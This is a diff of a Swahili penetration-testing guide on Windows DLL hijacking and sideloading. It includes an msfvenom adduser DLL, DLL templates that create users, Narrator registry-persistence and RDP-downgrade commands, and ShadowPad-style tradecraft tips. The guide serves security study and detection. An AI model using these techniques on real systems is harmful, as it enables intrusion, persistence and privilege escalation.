+4. Config hiyo hiyo inaweza kulazimisha CLR kutatua assemblies za ndani kwanza (kwa mfano `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) na inaweza kudhoofisha runtime validation/telemetry bila inline patching.
 
-Muundo wa mtindo wa campaign (nested structure halisi inaweza kutofautiana kulingana na directive / CLR version):
+Muundo wa aina ya campaign (upangaji halisi unaweza kutofautiana kulingana na directive / CLR version):
 ```xml
 <configuration>
 <runtime>
@@ -292,41 +292,41 @@ Muundo wa mtindo wa campaign (nested structure halisi inaweza kutofautiana kulin
 </configuration>
 ```
 Kwa nini hii ni muhimu:
-- **`<probing privatePath="."/>`** huweka assembly resolution kwenye directory ya application, na kugeuza folder hiyo kuwa sideloading surface inayotabirika.<sup>[[18]](#references)</sup>
-- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** huhamisha execution kwenye code ya attacker wakati wa CLR initialization, kabla logic halali ya application kuanza.<sup>[[16]](#references)[[17]](#references)</sup>
-- **`<bypassTrustedAppStrongNames enabled="true"/>`** inaweza kuruhusu full-trust application kupakia assemblies zisizo na signature au zilizochezewa bila kushindwa kwa strong-name validation.<sup>[[19]](#references)</sup>
+- **`<probing privatePath="."/>`** huweka assembly resolution ndani ya application directory, na kugeuza folder kuwa sideloading surface inayotabirika.<sup>[[18]](#references)</sup>
+- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** huhamisha execution kwenye attacker code wakati wa CLR initialization, kabla ya legitimate app logic kuanza.<sup>[[16]](#references)[[17]](#references)</sup>
+- **`<bypassTrustedAppStrongNames enabled="true"/>`** inaweza kuruhusu full-trust app kupakia unsigned au tampered assemblies bila strong-name validation failure.<sup>[[19]](#references)</sup>
 - **`<publisherPolicy apply="no"/>`** huepuka publisher-policy redirects zinazoelekeza kwenye assemblies mpya zaidi.<sup>[[20]](#references)</sup>
-- **`<requiredRuntime ... safemode="true"/>`** hufanya runtime selection iwe ya kutabirika zaidi.<sup>[[21]](#references)</sup>
-- **`<etwEnable enabled="false"/>`** ni ya kuvutia hasa kwa sababu **CLR huzima ETW visibility yake yenyewe** kupitia configuration badala ya implant kufanya patch ya `EtwEventWrite` kwenye memory.
+- **`<requiredRuntime ... safemode="true"/>`** hufanya runtime selection iwe ya kubashirika zaidi.<sup>[[21]](#references)</sup>
+- **`<etwEnable enabled="false"/>`** inavutia hasa kwa sababu **CLR huzima mwonekano wake wa ETW** kupitia configuration, badala ya implant kufanya patch ya `EtwEventWrite` kwenye memory.
 
-Operational pattern iliyoonekana kwenye campaigns za hivi karibuni:
-- Stage 1 huweka `setup.exe`, `setup.exe.config`, na assemblies za ndani.
-- Stage 2 huzinakili kwenye folder inayoaminika ya **AppData update**, hubadilisha jina la host kuwa kama `update.exe`, kisha huianzisha tena kupitia **scheduled task**.
-- Stage 3 huhakikisha execution context, kwa mfano parent anayetarajiwa `svchost.exe` kutoka Task Scheduler, kabla ya kupakia RAT DLL/export ya mwisho.
+Operational pattern iliyoonekana katika campaigns za hivi karibuni:
+- Stage 1 huweka `setup.exe`, `setup.exe.config`, na local assemblies.
+- Stage 2 huzinakili kwenye **AppData update** folder inayoaminika, hubadilisha jina la host kuwa kama `update.exe`, kisha huizindua tena kupitia **scheduled task**.
+- Stage 3 huthibitisha execution context, kwa mfano parent anayetarajiwa `svchost.exe` kutoka Task Scheduler, kabla ya kupakia RAT DLL/export ya mwisho.
 
-Mawazo ya Hunting:
-- **.NET executables** zilizosainiwa au halali kwa njia nyingine, zinazoendeshwa pamoja na mafaili ya **`.config`** ya kutiliwa shaka kwenye maeneo yanayoweza kuandikwa na user.
-- Mafaili ya `.config` yenye **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, au **`etwEnable enabled="false"`**.
-- Scheduled tasks zinazoanzisha tena update binaries zilizobadilishwa majina kutoka **`%LOCALAPPDATA%`** au directories maalum za application kama `\bin\update\`.
-- Parent/child chains ambapo scheduled task huanzisha .NET host inayoaminika ambayo mara moja hupakia assemblies zisizo za vendor kutoka kwenye directory yake yenyewe.
+Hunting ideas:
+- **.NET executables** zilizosainiwa au zilizo legitimate zinazoendeshwa pamoja na **`.config`** files zinazotia shaka katika maeneo ambayo user anaweza kuandika.
+- `.config` files zilizo na **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, au **`etwEnable enabled="false"`**.
+- Scheduled tasks zinazoanzisha tena update binaries zilizobadilishwa majina kutoka **`%LOCALAPPDATA%`** au directories maalum za app kama `\bin\update\`.
+- Parent/child chains ambapo scheduled task huanzisha trusted .NET host ambayo mara moja hupakia non-vendor assemblies kutoka directory yake yenyewe.
 
 #### Exceptions kwenye dll search order kutoka Windows docs
 
-Exceptions fulani kwenye standard DLL search order zimeainishwa kwenye Windows documentation:
+Windows documentation inataja exceptions fulani kwa standard DLL search order:
 
-- Wakati **DLL inayoshiriki jina na DLL ambayo tayari imepakiwa kwenye memory** inapopatikana, mfumo hupita usual search. Badala yake, hufanya check ya redirection na manifest kabla ya kutumia DLL ambayo tayari iko kwenye memory. **Katika hali hii, mfumo hautafuti DLL**.
-- Katika hali ambapo DLL inatambuliwa kama **known DLL** kwa Windows version ya sasa, mfumo utatumia version yake ya known DLL, pamoja na dependent DLLs zake, **bila kufanya search process**. Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** ina orodha ya known DLLs hizi.
-- Ikiwa **DLL ina dependencies**, search ya dependent DLLs hizi hufanyika kana kwamba zilionyeshwa kwa **module names** pekee, bila kujali kama DLL ya awali ilitambuliwa kupitia full path.
+- Wakati **DLL yenye jina linaloshiriki na iliyokwisha kupakiwa kwenye memory** inapopatikana, mfumo huruka search ya kawaida. Badala yake, hufanya check ya redirection na manifest kabla ya kutumia DLL ambayo tayari iko kwenye memory. **Katika hali hii, mfumo haufanyi search ya DLL**.
+- Ikiwa DLL inatambuliwa kama **known DLL** kwa Windows version ya sasa, mfumo utatumia toleo lake la known DLL, pamoja na dependent DLLs zake, **na kuacha search process**. Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** huhifadhi orodha ya known DLLs hizi.
+- Ikiwa **DLL ina dependencies**, search ya dependent DLLs hizi hufanywa kana kwamba zilitajwa kwa **module names** pekee, bila kujali kama DLL ya awali ilitambuliwa kupitia full path.
 
 ### Kuongeza Privileges
 
-**Masharti**:
+**Mahitaji**:
 
 - Tambua process inayoendeshwa au itakayoendeshwa chini ya **privileges tofauti** (horizontal au lateral movement), na ambayo **inakosa DLL**.
-- Hakikisha kuna **write access** kwa **directory** yoyote ambayo **DLL** itatafutwa. Eneo hili linaweza kuwa directory ya executable au directory iliyo ndani ya system path.
+- Hakikisha kuna **write access** kwenye **directory** yoyote ambako **DLL** itafanyiwa **search**. Eneo hili linaweza kuwa directory ya executable au directory iliyo ndani ya system path.
 
-Ndiyo, masharti haya ni magumu kuyapata kwa sababu **kwa default ni jambo lisilo la kawaida kupata executable yenye privileges inayokosa dll**, na ni **jambo lisilo la kawaida zaidi kuwa na write permissions kwenye system path folder** (huwezi kwa default). Lakini, kwenye mazingira yaliyowekwa vibaya, hili linawezekana.\
-Iwapo una bahati na unakidhi masharti hayo, unaweza kuangalia mradi wa [UACME](https://github.com/hfiref0x/UACME). Ingawa **lengo kuu la mradi ni bypass UAC**, unaweza kupata **PoC** ya Dll hijaking kwa Windows version husika ambayo unaweza kutumia (huenda ukahitaji tu kubadilisha path ya folder ambayo una write permissions).
+Masharti haya kwa kawaida si ya kawaida kwa default: privileged executables kwa kawaida hazikosi missing DLL dependencies, na standard users kwa kawaida hawawezi kuandika kwenye system search-path directories. Environments zilizosanidiwa vibaya bado zinaweza kufichua masharti yote mawili.\
+Ikiwa mahitaji yametimizwa, angalia project ya [UACME](https://github.com/hfiref0x/UACME). Ingawa lengo lake kuu ni UAC bypass, ina DLL-hijacking PoCs za Windows versions maalum ambazo mara nyingi zinaweza kurekebishwa kulingana na writable directory uliyopata.
 
 Kumbuka kwamba unaweza **kuangalia permissions zako kwenye folder** kwa kufanya:<sup>[[5]](#references)</sup>
 ```bash
@@ -337,12 +337,12 @@ Na **kagua ruhusa za folda zote zilizo ndani ya PATH**:
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
-Unaweza pia kuangalia imports za executable na exports za dll kwa kutumia:
+Unaweza pia kuangalia imports za executable na exports za dll kwa:
 ```bash
 dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
 ```
-Kwa mwongozo kamili wa jinsi ya **abuse Dll Hijacking to escalate privileges** ukiwa na ruhusa za kuandika katika **System Path folder**, angalia:
+Kwa mwongozo kamili wa jinsi ya **kutumia vibaya Dll Hijacking ili kuongeza privileges** ukiwa na ruhusa za kuandika kwenye **System Path folder**, angalia:
 
 
 {{#ref}}
@@ -351,21 +351,21 @@ writable-sys-path-dll-hijacking-privesc.md
 
 ### Zana za kiotomatiki
 
-[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)itaangalia ikiwa una ruhusa za kuandika kwenye folder yoyote iliyo ndani ya system PATH.\
-Zana nyingine za kiotomatiki zinazovutia za kugundua vulnerability hii ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._
+[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)itaangalia ikiwa una ruhusa za kuandika kwenye folder lolote lililo ndani ya system PATH.\
+Zana nyingine za kuvutia za kiotomatiki za kugundua vulnerability hii ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._
 
 ### Mfano
 
-Iwapo utapata scenario inayoweza ku-exploit, mojawapo ya mambo muhimu zaidi ya kuweza ku-exploit kwa mafanikio ni **kuunda dll inayotoa angalau functions zote ambazo executable ita-import kutoka humo**. Hata hivyo, kumbuka kuwa Dll Hijacking ni muhimu kwa ajili ya [escalate kutoka Medium Integrity level hadi High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) au kutoka[ **High Integrity hadi SYSTEM**](../index.html#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **jinsi ya kuunda dll halali** ndani ya utafiti huu wa dll hijacking unaolenga dll hijacking kwa ajili ya execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
-Zaidi ya hayo, katika **sehemu inayofuata** unaweza kupata baadhi ya **basic dll codes** ambazo zinaweza kuwa muhimu kama **templates** au kwa ajili ya kuunda **dll yenye functions zisizohitajika zilizo-export**.
+Iwapo utapata scenario inayoweza kutumika vibaya, mojawapo ya mambo muhimu zaidi ili ku-exploit kwa mafanikio ni **kuunda dll inayotoa angalau functions zote ambazo executable ita-import kutoka kwake**. Hata hivyo, kumbuka kwamba Dll Hijacking ni muhimu kwa [kuongeza privileges kutoka Medium Integrity level hadi High **(kupita UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) au kutoka[ **High Integrity hadi SYSTEM**](../index.html#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **jinsi ya kuunda dll halali** ndani ya study hii ya dll hijacking inayolenga dll hijacking kwa ajili ya execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
+Zaidi ya hayo, katika **sehemu inayofuata** utapata baadhi ya **basic dll codes** ambazo zinaweza kuwa muhimu kama **templates** au kwa kuunda **dll yenye functions ambazo si lazima ziwe exported**.
 
 ## **Kuunda na ku-compile Dlls**
 
 ### **Dll Proxifying**
 
-Kimsingi, **Dll proxy** ni Dll yenye uwezo wa **execute code yako malicious inapopakiwa**, lakini pia ya **ku-expose** na **kufanya kazi** kama ilivyo **expected** kwa **ku-relay calls zote kwenye library halisi**.
+Kimsingi, **Dll proxy** ni Dll yenye uwezo wa **ku-execute code yako hasidi inapopakiwa**, lakini pia **ku-expose** na **kufanya kazi** kama **inavyotarajiwa** kwa **kupeleka calls zote kwenye library halisi**.
 
-Kwa kutumia tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus), unaweza **ku-indicate executable na kuchagua library** unayotaka ku-proxify na **ku-generate proxified dll**, au **ku-indicate Dll** na **ku-generate proxified dll**.
+Kwa kutumia zana [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus), unaweza **kuonyesha executable na kuchagua library** unayotaka ku-proxify na **kuzalisha proxified dll**, au **kuonyesha Dll** na **kuzalisha proxified dll**.
 
 ### **Meterpreter**
 
@@ -383,10 +383,10 @@ msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
 ### Yako mwenyewe
 
-Kumbuka kwamba katika baadhi ya hali, DLL unayokompile lazima **iexport functions kadhaa** ambazo zitaloadiwa na victim process; ikiwa functions hizi hazipo, **binary haitaweza kuziload** na **exploit itashindwa**.
+Katika hali nyingi, DLL unayokompile lazima **iexport kila function iliyoimportiwa na victim process**. Ikiwa export inayohitajika haipo, binary haiwezi kuirekebisha, na exploit hushindwa.
 
 <details>
-<summary>C DLL template (Win10)</summary>
+<summary>Template ya C DLL (Win10)</summary>
 ```c
 // Tested in Win10
 // i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
@@ -422,7 +422,7 @@ return TRUE;
 }
 ```
 <details>
-<summary>Mfano wa C++ DLL wenye uundaji wa mtumiaji</summary>
+<summary>C++ DLL example with user creation</summary>
 ```c
 //x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
 //x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a
@@ -473,20 +473,20 @@ return TRUE;
 ```
 </details>
 
-## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)
+## Uchunguzi wa Kesi: DLL Hijack ya Narrator OneCore TTS Localization (Accessibility/ATs)
 
-Windows Narrator.exe bado huchunguza DLL ya localization inayotabirika na maalum kwa lugha wakati wa kuanza, ambayo inaweza kuhijackiwa kwa ajili ya arbitrary code execution na persistence.<sup>[[7]](#references)</sup>
+Windows Narrator.exe bado huchunguza DLL ya localization inayotabirika na mahususi kwa lugha wakati wa kuanza, ambayo inaweza kuhijackiwa kwa ajili ya utekelezaji wa code kiholela na persistence.<sup>[[7]](#references)</sup>
 
-Key facts
-- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
-- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
-- Ikiwa DLL inayoweza kuandikwa na inayodhibitiwa na attacker ipo kwenye OneCore path, inapakiwa na `DllMain(DLL_PROCESS_ATTACH)` hutekelezwa. Hakuna exports zinazohitajika.
+Mambo muhimu
+- Probe path (build za sasa): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
+- Legacy path (build za zamani): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
+- Ikiwa DLL inayodhibitiwa na attacker na yenye uwezo wa kuandikwa ipo kwenye OneCore path, hupakiwa na `DllMain(DLL_PROCESS_ATTACH)` hutekelezwa. Exports hazihitajiki.
 
-Discovery with Procmon
-- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
+Utambuzi kwa Procmon
+- Filter: `Process Name is Narrator.exe` na `Operation is Load Image` au `CreateFile`.
 - Anzisha Narrator na uangalie jaribio la kupakia path iliyo hapo juu.
 
-Minimal DLL
+DLL ndogo zaidi
 ```c
 // Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
 BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
@@ -498,24 +498,24 @@ if (r == DLL_PROCESS_ATTACH) {
 return TRUE;
 }
 ```
-OPSEC silence
-- Hijack ya kijinga itaonyesha/kuangazia UI. Ili kubaki kimya, wakati wa attach enumerata threads za Narrator, fungua main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) na uitumie `SuspendThread`; endelea katika thread yako mwenyewe. Angalia PoC kwa code kamili.<sup>[[8]](#references)</sup>
+OPSEC ukimya
+- Hijack ya kawaida itaonyesha/kuangazia UI. Ili ibaki kimya, wakati wa attach enumerate threads za Narrator, fungua thread kuu (`OpenThread(THREAD_SUSPEND_RESUME)`) na uiweke `SuspendThread`; endelea kwenye thread yako mwenyewe. Tazama PoC kwa code kamili.<sup>[[8]](#references)</sup>
 
 Trigger na persistence kupitia Accessibility configuration
-- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
+- Muktadha wa mtumiaji (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
 - Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
-- Kwa kutumia yaliyo hapo juu, kuanzisha Narrator kunapakia DLL iliyopandikizwa. Kwenye secure desktop (logon screen), bonyeza CTRL+WIN+ENTER kuanzisha Narrator; DLL yako itatekelezwa kama SYSTEM kwenye secure desktop.
+- Kwa kutumia yaliyo hapo juu, kuanzisha Narrator kunapakia DLL iliyowekwa. Kwenye secure desktop (logon screen), bonyeza CTRL+WIN+ENTER kuanzisha Narrator; DLL yako itatekelezwa kama SYSTEM kwenye secure desktop.
 
-RDP-triggered SYSTEM execution (lateral movement)
+Utekelezaji wa SYSTEM unaoanzishwa na RDP (lateral movement)
 - Ruhusu classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
 - Unganisha kwa RDP kwenye host, kwenye logon screen bonyeza CTRL+WIN+ENTER kuanzisha Narrator; DLL yako itatekelezwa kama SYSTEM kwenye secure desktop.
-- Execution husimama RDP session inapofungwa—inject/migrate haraka.
+- Utekelezaji hukoma RDP session inapofungwa—inject/migrate mara moja.
 
 Bring Your Own Accessibility (BYOA)
-- Unaweza ku-clone built-in Accessibility Tool (AT) registry entry (kwa mfano, CursorIndicator), kuihariri ielekeze kwenye arbitrary binary/DLL, kui-import, kisha kuweka `configuration` kuwa jina la AT hiyo. Hii huproxy arbitrary execution chini ya Accessibility framework.
+- Unaweza ku-clone entry ya built-in Accessibility Tool (AT) kwenye registry (kwa mfano, CursorIndicator), kuihariri ili ielekeze kwenye binary/DLL yoyote, kui-import, kisha kuweka `configuration` kwenye jina hilo la AT. Hii hu-proxy arbitrary execution chini ya Accessibility framework.
 
 Notes
-- Kuandika chini ya `%windir%\System32` na kubadilisha values za HKLM kunahitaji admin rights.
+- Kuandika chini ya `%windir%\System32` na kubadilisha thamani za HKLM kunahitaji admin rights.
 - Logic yote ya payload inaweza kuwekwa ndani ya `DLL_PROCESS_ATTACH`; exports hazihitajiki.
 
 ## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe
@@ -525,13 +525,13 @@ Case hii inaonyesha **Phantom DLL Hijacking** katika Lenovo's TrackPoint Quick M
 ### Vulnerability Details
 
 - **Component**: `TPQMAssistant.exe` iliyoko katika `C:\ProgramData\Lenovo\TPQM\Assistant\`.
-- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` huendeshwa kila siku saa 9:30 AM chini ya context ya logged-on user.
+- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` huendeshwa kila siku saa 9:30 AM chini ya muktadha wa mtumiaji aliye-log on.
 - **Directory Permissions**: Inaweza kuandikwa na `CREATOR OWNER`, hivyo kuruhusu local users kuweka arbitrary files.
-- **DLL Search Behavior**: Hujaribu kupakia `hostfxr.dll` kutoka working directory yake kwanza na huandika log ya "NAME NOT FOUND" ikiwa haipo, jambo linaloonyesha local directory search precedence.
+- **DLL Search Behavior**: Hujaribu kupakia `hostfxr.dll` kutoka kwenye working directory yake kwanza na huandika log ya "NAME NOT FOUND" ikiwa haipo, jambo linaloonyesha kipaumbele cha local directory search.
 
 ### Exploit Implementation
 
-Attacker anaweza kuweka malicious `hostfxr.dll` stub katika directory hiyo hiyo, akitumia DLL inayokosekana ili kupata code execution chini ya context ya user:
+Attacker anaweza kuweka malicious `hostfxr.dll` stub kwenye directory hiyo hiyo, akitumia DLL inayokosekana ili kufanikisha code execution chini ya muktadha wa mtumiaji:
 ```c
 #include <windows.h>
 
@@ -543,30 +543,30 @@ MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
 return TRUE;
 }
 ```
-### Attack Flow
+### Mtiririko wa Attack
 
-1. Kama mtumiaji wa kawaida, weka `hostfxr.dll` katika `C:\ProgramData\Lenovo\TPQM\Assistant\`.
-2. Subiri scheduled task iendeshe saa 9:30 AM chini ya context ya mtumiaji wa sasa.
-3. Ikiwa administrator ameingia wakati task inatekelezwa, DLL yenye madhara itaendeshwa katika session ya administrator kwa medium integrity.
-4. Unganisha mbinu za kawaida za UAC bypass ili kutoka medium integrity hadi SYSTEM privileges.
+1. Kama mtumiaji wa kawaida, weka `hostfxr.dll` kwenye `C:\ProgramData\Lenovo\TPQM\Assistant\`.
+2. Subiri scheduled task iendeshe saa 9:30 AM katika context ya mtumiaji wa sasa.
+3. Ikiwa administrator ameingia wakati task inatekelezwa, DLL hasidi itaendeshwa katika session ya administrator ikiwa na medium integrity.
+4. Chain standard UAC bypass techniques ili kuinua kutoka medium integrity hadi SYSTEM privileges.
 
-## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)
+## Case Study: MSI CustomAction Dropper + DLL Side-Loading kupitia Signed Host (wsc_proxy.exe)
 
 Threat actors mara nyingi huunganisha droppers za MSI na DLL side-loading ili kuendesha payloads chini ya trusted, signed process.<sup>[[10]](#references)</sup>
 
-Chain overview
-- Mtumiaji anapakua MSI. CustomAction inaendeshwa kimya wakati wa GUI install (kwa mfano, LaunchApplication au VBScript action), na kujenga upya next stage kutoka embedded resources.
-- Dropper inaandika legitimate, signed EXE na malicious DLL katika directory moja (mfano wa pair: wsc_proxy.exe iliyosainiwa na Avast + wsc.dll inayodhibitiwa na attacker).
-- Signed EXE inapoanzishwa, Windows DLL search order inapakia wsc.dll kutoka working directory kwanza, na kutekeleza attacker code chini ya signed parent (ATT&CK T1574.001).
+Muhtasari wa chain
+- Mtumiaji anapakua MSI. CustomAction huendeshwa kimya wakati wa GUI install (kwa mfano, LaunchApplication au VBScript action), na kujenga upya stage inayofuata kutoka embedded resources.
+- Dropper huandika EXE halali na signed pamoja na DLL hasidi kwenye directory hiyo hiyo (mfano wa pair: Avast-signed wsc_proxy.exe + wsc.dll inayodhibitiwa na attacker).
+- Signed EXE inapoanzishwa, Windows DLL search order hupakia wsc.dll kutoka working directory kwanza, na kutekeleza attacker code chini ya signed parent (ATT&CK T1574.001).
 
-MSI analysis (cha kutafuta)
+Uchambuzi wa MSI (cha kutafuta)
 - CustomAction table:
-- Tafuta entries zinazoendesha executables au VBScript. Mfano wa suspicious pattern: LaunchApplication inayoendesha embedded file kwa background.
+- Tafuta entries zinazoendesha executables au VBScript. Mfano wa pattern inayotia shaka: LaunchApplication inayotekeleza embedded file kwa background.
 - Katika Orca (Microsoft Orca.exe), kagua CustomAction, InstallExecuteSequence na Binary tables.
 - Embedded/split payloads katika MSI CAB:
 - Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
 - Au tumia lessmsi: lessmsi x package.msi C:\out
-- Tafuta fragments nyingi ndogo zinazounganishwa na kusimbuliwa na VBScript CustomAction. Common flow:
+- Tafuta fragments nyingi ndogo ambazo huunganishwa na kusimbuliwa na VBScript CustomAction. Mtiririko wa kawaida:
 ```vb
 ' VBScript CustomAction (high level)
 ' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
@@ -574,11 +574,11 @@ MSI analysis (cha kutafuta)
 ' 3) Decrypt using a hardcoded password/key
 ' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
 ```
-Practical sideloading kwa kutumia wsc_proxy.exe
-- Weka mafaili haya mawili kwenye folder moja:
-- wsc_proxy.exe: host halali iliyosainiwa (Avast). Process hujaribu kupakia wsc.dll kwa kutumia jina lake kutoka kwenye directory yake.
-- wsc.dll: attacker DLL. Ikiwa exports maalum hazihitajiki, DllMain inaweza kutosha; vinginevyo, build proxy DLL na u-forward exports zinazohitajika kwenye library halisi huku ukiendesha payload katika DllMain.
-- Build DLL payload ndogo:
+Practical sideloading with wsc_proxy.exe
+- Weka faili hizi mbili kwenye folder moja:
+- wsc_proxy.exe: host halali iliyosainiwa (Avast). Process hujaribu ku-load wsc.dll kwa jina kutoka kwenye directory yake.
+- wsc.dll: attacker DLL. Ikiwa hakuna exports maalum zinazohitajika, DllMain inaweza kutosha; vinginevyo, build proxy DLL na forward exports zinazohitajika kwenye library halisi huku ukiendesha payload katika DllMain.
+- Build payload ndogo ya DLL:
 ```c
 // x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
 #include <windows.h>
@@ -589,110 +589,110 @@ WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
 return TRUE;
 }
 ```
-- Kwa mahitaji ya export, tumia framework ya proxying (kwa mfano, DLLirant/Spartacus) kutengeneza forwarding DLL ambayo pia hutekeleza payload yako.
+- Kwa mahitaji ya export, tumia framework ya proxying (kwa mfano, DLLirant/Spartacus) kutengeneza forwarding DLL ambayo pia huendesha payload yako.
 
-- Mbinu hii hutegemea utatuzi wa majina ya DLL na host binary. Ikiwa host inatumia absolute paths au safe loading flags (kwa mfano, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack inaweza kushindikana.
+- Technique hii hutegemea utatuzi wa majina ya DLL na host binary. Ikiwa host inatumia absolute paths au safe loading flags (kwa mfano, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack inaweza kushindwa.
 - KnownDLLs, SxS, na forwarded exports zinaweza kuathiri precedence na lazima zizingatiwe wakati wa kuchagua host binary na export set.
 
-## Triads zilizosainiwa + payloads zilizosimbwa (case study ya ShadowPad)
+## Triad zilizotiwa saini + payloads zilizosimbwa (ShadowPad case study)
 
-Check Point ilieleza jinsi Ink Dragon inavyotumia ShadowPad kwa kutumia **three-file triad** ili kujichanganya na software halali huku ikiweka core payload ikiwa encrypted kwenye disk:<sup>[[12]](#references)</sup>
+Check Point ilieleza jinsi Ink Dragon inavyotumia ShadowPad kwa kutumia **three-file triad** ili kujichanganya na software halali huku ikihifadhi core payload ikiwa encrypted kwenye disk:<sup>[[12]](#references)</sup>
 
-1. **Signed host EXE** – vendors kama AMD, Realtek, au NVIDIA hutumiwa vibaya (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Washambuliaji hubadilisha jina la executable ili ionekane kama Windows binary (kwa mfano `conhost.exe`), lakini Authenticode signature hubaki valid.
-2. **Malicious loader DLL** – huwekwa karibu na EXE ikiwa na jina linalotarajiwa (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL huwa kwa kawaida MFC binary iliyofichwa kwa kutumia ScatterBrain framework; kazi yake pekee ni kutafuta encrypted blob, ku-decrypt, na kufanya reflective mapping ya ShadowPad.
-3. **Encrypted payload blob** – mara nyingi huhifadhiwa kama `<name>.tmp` kwenye directory hiyo hiyo. Baada ya kufanya memory-mapping ya payload iliyodecrypted, loader hufuta TMP file ili kuharibu forensic evidence.
+1. **Signed host EXE** – vendors kama AMD, Realtek, au NVIDIA hutumiwa vibaya (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Attackers hubadilisha jina la executable ili ionekane kama Windows binary (kwa mfano `conhost.exe`), lakini Authenticode signature hubaki valid.
+2. **Malicious loader DLL** – huwekwa kando ya EXE ikiwa na jina linalotarajiwa (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL kwa kawaida huwa MFC binary iliyofichwa kwa ScatterBrain framework; kazi yake pekee ni kutafuta encrypted blob, ku-decrypt, na kufanya reflectively map ya ShadowPad.
+3. **Encrypted payload blob** – mara nyingi huhifadhiwa kama `<name>.tmp` kwenye directory hiyo hiyo. Baada ya memory-mapping payload iliyodecrypted, loader hufuta TMP file ili kuharibu forensic evidence.
 
-Tradecraft notes:
+Vidokezo vya tradecraft:
 
-* Kubadilisha jina la signed EXE (huku ukihifadhi `OriginalFileName` ya awali kwenye PE header) huiruhusu kujifanya Windows binary huku ikihifadhi vendor signature, kwa hiyo iga tabia ya Ink Dragon ya kuweka binaries zinazoonekana kama `conhost.exe` lakini ambazo kwa kweli ni AMD/NVIDIA utilities.
-* Kwa kuwa executable hubaki trusted, allowlisting controls nyingi huhitaji tu malicious DLL yako iwekwe kando yake. Zingatia ku-customize loader DLL; signed parent kwa kawaida inaweza kuendeshwa bila kubadilishwa.
